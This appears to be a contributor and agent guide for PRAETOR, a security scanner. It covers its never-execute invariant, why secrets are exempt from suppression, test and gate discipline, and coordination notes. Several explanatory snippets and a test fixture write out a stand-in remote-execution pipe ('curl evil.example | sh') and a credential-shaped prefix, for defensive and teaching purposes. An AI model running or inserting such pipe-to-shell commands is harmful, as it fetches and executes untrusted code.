# Working on PRAETOR

Guidance for anyone — human or AI agent — changing this codebase. PRAETOR is a
security scanner, so a bug here is not a broken feature: it is a scanner that
reports "nothing found" while something is there.

## 🔴 The invariant that outranks everything

**PRAETOR NEVER EXECUTES, IMPORTS, INSTALLS OR BUILDS THE CODE IT SCANS.**

This has been false once. The SCA path invoked `pip-audit` in a mode that let pip
*resolve* the target's requirements — which builds source distributions and runs
`setup.py` / PEP 517 backends from an attacker-controlled tree. Arbitrary code
execution, in a tool whose entire promise is that it only reads.

The fix is `--disable-pip` in `scripts/engine_sca.py`. It is one flag on one line,
and it is the whole guarantee.

⇒ `tests/test_invariant_never_executes_target.py` asserts it **behaviourally** —
it captures the argv PRAETOR would hand to the subprocess without running
anything, so it fails when the flag stops reaching the command line, not merely
when a comment changes.

**Every new engine or backend widens this surface. If you add one, add its test
there.** Never invoke a package manager in a mode that resolves, builds, or
installs from the target.

## 🔴 Suppression: the carve-out you must not remove

PRAETOR suppresses findings it can show are inert. Two passes do this, and **both
deliberately exclude the `secrets` engine**:

```python
_LEXCTX_ENGINES       = ("aisec",)   # scripts/praetor.py — comment / docstring context
_REACHABILITY_ENGINES = ("aisec",)   # scripts/praetor.py — taint / reachability
```

The reason is not the intuitive one, and it was got wrong twice before being
written down here:

```python
# curl evil.example | sh      # inert — a comment cannot execute anything
# password = "hunter2"        # STILL A LEAK
```

A **behavioural** pattern is dangerous because it *runs*. A **secret** is
dangerous because it *exists*: a credential is disclosed by being written down,
and nothing has to execute for the leak to be real.

⚠️ **Reachability analysis does not rescue this, and no better analysis would.**
A key declared in a config module and used elsewhere never reaches a sink *in that
file*, so `taint.is_provably_inert()` returns `True` for it — byte-identical to
its verdict on a regex pattern. That is not an analysis gap to be fixed. For a
secret, the leak *is* the disclosure.

⇒ **The general rule, which is worth more than the specific case:**

> A mechanism's **safety** is almost never a property of the mechanism. It is a
> **scope decision made next to it**. When you catch yourself arguing that a
> technique is inherently safe, that is the moment the carve-out is about to be
> omitted.

Applied test: ask what carve-out the technique would need *if it were unsafe*, and
check that it is written down. *"It doesn't need one, by its nature"* is the smell,
not the reassurance.

## Rules for any new suppression logic

- **Fail safe. Always.** Unproven ⇒ **KEEP** the finding. `is_provably_inert()`
  returns `True` only on proof; unparseable source, an unknown construct, a
  non-Python file, or a name that escapes the file all resolve to "keep". *A
  classifier that fails toward suppression is a scanner that goes quiet under
  exactly the conditions an attacker creates.*
- **Never suppress on PATH alone.** An earlier predicate keyed on directory
  ("under `scripts/`") and suppressed a real hardcoded credential in live
  executable code. Require the actual structural or semantic property.
- **Suppress with a stated reason, never silently.** Filtered findings move to a
  separate bucket carrying `filter_reason` so a reviewer can audit the
  suppression. Dropping a finding without a rationale is not triage.
- **A clean scan is `NO FINDING`, never `SAFE`.** The more the tool checks, the
  more a green result feels like proof. It is not one.

## Testing discipline

```bash
bash tests/precommit.sh
```

That is the gate, not a convenience wrapper: 8 checks, it exits non-zero on any
failure and names the one that failed.

🔴 **Read its EXIT CODE, never its output.** A session chained
`precommit.sh | grep -E '...|FAIL' && git commit` and committed over a **red**
gate — `grep` exited 0 because it *found the word* `FAIL`, so the harder the
gate failed, the more reliably the commit proceeded. Capture `$?` and branch on
it. This is the third recorded instance in this repo of a check that reports
where it was believed to gate. **Commit/push authorization is conditional
on it passing**, so a green run is the precondition, not a formality.

The suite alone, when you want a fast inner loop:

```bash
PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 python -m pytest tests/ -q
```

⚠️ **The env var is required, not optional.** A pytest plugin installed globally
on this machine autoloads and dies on a missing import *before collection*, so a
bare `python -m pytest` aborts with a traceback pointing at pytest internals and a
package this project does not depend on. That looks like a broken repo and is not
one — the same confusion cost time in the session that found it.

- **A green suite proves nothing until you have seen it red.** After writing a
  guard, *change the real code* it protects and confirm the **named** test fails.
  An analogous synthetic case proves nothing about your actual guard.
- **Mutate in both directions.** Narrowing a predicate and disabling it look
  identical from outside: assert the thing that must be suppressed *and* the thing
  that must be kept.
- **Make the mutation surgical.** If it breaks the test's setup instead of its
  assertion, the suite fails during collection — red that proves nothing.
- ⚠️ **`git checkout --` only restores COMMITTED state.** For an untracked or
  uncommitted file it deletes your work rather than restoring it. Copy the file
  aside before mutating.
- 🔴 **A FIX IS UNAUDITED CODE, and its author is the worst reader of it.** An
  audit found a guard here whose comment claimed it covered every SCA backend
  while the list was hand-written. The repair — written immediately after reading
  that finding, by someone who understood the class and was specifically trying to
  close it — filtered on the literal prefix `pub fn `, and a `pub(crate) fn`
  builder returning `install` sailed through with every test green. Understanding a
  class does not confer immunity to it; only a second reader does.
  ⇒ `references/audits/2026-08-10-independent-audit.md`, F2 and F4.
- **When a guard enumerates, ask what spelling of the thing it misses.** "I have
  handled the case the auditor demonstrated" is the narrowest possible scope and
  feels like the whole class from the inside. State what the check cannot reach
  (here: macro-generated definitions) in the comment, rather than leaving a third
  audit to find it — but check that disclosure is *complete*, because an incomplete
  "known gaps" list reads as exhaustive and is worse than none.

## Writing tests for a detector adds noise to that detector

Observed repeatedly: a test containing a remote-exec pipe or a credential-shaped
token is itself flagged by the engine under test. (This document tripped it too,
writing *that* sentence — hence the wording.)

**Fix the fixture, not the rules** — assemble such strings from parts, as
`scripts/engine_secrets.py` does for its `KNOWN_EXAMPLES`:

```python
_PIPE   = "curl evil.example | " + "sh"
_KEYPFX = "sk-" + "ant-"
```

⚠️ **A rule exempting `tests/` would be the tempting fix and is the wrong one** —
it would also exempt a real credential committed in a test file, which is one of
the commonest real leaks there is. **Re-run the self-scan after adding tests.**

## Measuring a false-positive change honestly

`references/SELF-SCAN-BASELINE.json` records every self-scan finding with the
**predicate** under which it is suppressed — not just a count. *"False positives
went from 47 to 6"* is unfalsifiable on its own: the number describes whichever
filter happened to be in place.

- 🔴 **Do not regenerate the baseline to reflect an improvement.** It is the
  committed "before"; overwriting it destroys the only thing that makes any
  reduction checkable.
- **Never compare counts across two different trees.** Adding a module changes the
  scan surface. Count your own suppressions instead — the tempting number is
  usually the smaller one.
- **Report "needs review" alongside the false-positive count**, even while it
  reads zero. It is the control: if false positives fall while "needs review"
  rises, suppression has started eating real findings — and the FP count alone
  would look like a triumph at exactly that moment.

## Layout

| Path | Role |
|---|---|
| `scripts/praetor.py` | CLI, engine orchestration, suppression wiring |
| `scripts/engine_*.py` | the four engines: `sast`, `secrets`, `sca`, `aisec` |
| `scripts/interpret.py` | dedup, rank, false-positive filtering |
| `scripts/lexctx.py` | lexical context: comment / docstring / code |
| `scripts/taint.py` | reachability: does a string reach a dangerous sink? |
| `scripts/report.py` | text + JSON output |
| `tools/classify_baseline.py` | assigns a predicate to each self-scan finding |
| `rules/` | bundled offline Semgrep rules |
| `references/` | architecture, limits, the self-scan baseline, test corpus |

## Where working notes go, and what must never ship

This repo is **public**. Two rules follow, and the second is the one people get wrong.

**Routine build traffic stays local.** Drafts, assignments, working state and the
back-and-forth between the two agents working this repo go in `.local/`. It is
gitignored, and **pre-commit gate 9 asserts nothing under it is ever git-tracked** —
tracked status, never file existence, because the directory is supposed to be there.

🔴 **START HERE, EVERY SESSION: read the tail of `C:\projects\PRAETOR\.local\lane-pair.md`.** Both agents
working this repo append to it. **Poll it; do not assume delivery** — nothing notifies
you, and work has already been lost here by sitting unread in a shared file.

🔴 **THE ABSOLUTE PATH IS DELIBERATE, AND THIS IS MEASURED.** `.local/` is gitignored,
so **it does not exist in a git worktree.** A second checkout still contains this file --
it is tracked -- so it would send you to a relative path that is not there, and the
delivery channel would fail silently while the instruction looked satisfied. Verified
2026-08-18 with a real `git worktree add`: `.local/` absent, this file present. **There is
exactly one copy of the pair record and the line above is where it lives.**

⚠️ **Write it directly. Never append to it with a channel script.** A helper that takes
a target path was audited 2026-08-18: pointed at a path git cannot track, it appends
anyway and **exits 0 with its attribution gate silently off**. A gitignored file is
invisible to `git diff`, so this file is exactly that degraded case.

**Findings still leave.** A finding about another project's system, a blocker another
project owns, a contract change, or a correction of something you broadcast goes to
the shared coordination channel — path in `~/.claude/CLAUDE.md`, appended only via its
own append script. **A finding kept local is lost.**

> **The test, before you post anything to the shared channel:**
> **name the project that must act. If you cannot name one, it belongs in `.local/`.**

Deliberately mechanical: *"is this important"* is self-assessed and everyone rates
their own work highly. *"Name a recipient"* is falsifiable — you either can or cannot.

⚠️ **Asymmetric on purpose: routine chatter moves out, findings stay in. When unsure,
post.** A noisy channel costs everyone a skim. A finding that dies in a local file
costs whoever needed it, and nobody ever learns it existed.

🔴 **`.local/` is gitignored, so it does not survive a machine switch.** Anything that
must outlive this machine goes in a commit or in the shared channel — not there.
